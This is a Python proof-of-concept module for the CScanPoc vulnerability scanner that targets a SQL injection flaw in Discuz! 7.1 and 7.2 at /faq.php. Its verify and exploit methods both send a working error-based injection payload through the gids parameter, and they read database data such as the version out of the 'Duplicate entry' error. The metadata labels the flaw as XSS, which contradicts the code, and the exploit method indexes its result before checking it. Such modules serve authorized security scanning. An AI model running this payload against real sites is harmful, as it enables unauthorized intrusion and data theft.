# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Discuz_0018'  # 平台漏洞编号，留空
    name = 'Discuz! 7.2 /faq.php sql注入漏洞'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-09-22'  # 漏洞公布时间
    desc = '''
        Discuz! 7.1 和 7.2 版本的faq.php文件存在sql注入漏洞
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=66095'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Discuz! 7.1 7.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cd693ecf-20c7-40e1-ba58-70baadbdc455'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23"
            attack_url = '{target}'.format(target=self.target) + '/faq.php'

            request = urllib.request.Request(attack_url, payload)
            response = urllib.request.urlopen(request)
            content = response.read()
            reg = re.compile('Duplicate entry (.*?) for key')
            res = reg.findall(content)

            if res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            payload = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23"
            attack_url = '{target}'.format(target=self.target) + '/faq.php'

            request = urllib.request.Request(attack_url, payload)
            response = urllib.request.urlopen(request)
            content = response.read()
            reg = re.compile('Duplicate entry (.*?) for key')
            res = reg.findall(content)

            exploit_data = res[0]

            if res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据为{data}'.format(
                    target=self.target, name=self.vuln.name, data=exploit_data))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
